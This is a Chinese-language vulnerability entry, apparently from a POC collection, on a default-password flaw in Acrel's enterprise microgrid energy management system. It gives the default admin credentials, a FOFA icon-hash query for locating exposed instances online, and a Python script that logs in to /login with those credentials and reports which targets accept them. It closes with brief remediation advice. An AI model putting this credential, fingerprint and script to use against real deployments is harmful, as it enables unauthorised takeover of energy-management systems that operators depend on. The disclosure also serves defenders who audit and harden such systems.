# 安科瑞企业微电网能效管理系统 默认密码漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 安科瑞企业微电网能效管理系统 默认密码漏洞 |
| 漏洞类型 | 默认口令 |
| 影响组件 | 管理后台 |
| 影响版本 | 安科瑞企业微电网能效管理系统 |

## 漏洞概述

安科瑞企业微电网能效管理系统存在默认密码漏洞，攻击者可通过默认账号密码 admin:Acrel001 登录后台，获取系统权限。

## fofa查询语句

```
icon_hash="-1291691164"
```

## 漏洞复现

### POC

```python
import requests

def check(target):
    url = f"{target}/login"
    data = {
        "username": "admin",
        "password": "Acrel001"
    }
    try:
        r = requests.post(url, json=data, timeout=10)
        if "success" in r.text.lower() or r.status_code == 200:
            print(f"[+] {target} 存在默认密码 admin:Acrel001")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[!] {target} 请求失败: {e}")

if __name__ == "__main__":
    check("http://target.com")
```

### 漏洞特征

- 默认账号：admin
- 默认密码：Acrel001
- 路径：/login

## 修复建议

1. 修改默认口令
2. 强制用户首次登录修改密码
3. 实施账户锁定策略
